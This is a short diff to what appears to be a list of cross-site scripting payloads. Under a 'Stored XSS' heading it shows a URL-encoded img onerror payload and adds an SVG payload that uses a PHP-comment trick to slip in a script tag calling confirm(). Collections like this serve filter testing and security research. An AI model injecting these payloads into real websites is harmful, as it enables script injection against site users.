@@ -21,6 +21,8 @@ Stored XSS
 
 %5C%22%3E%3C%3Cimg%20onerror%3Dalert%2855%29%20src%3E
 
+<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
+
 
 Encoded
 -----------------------------
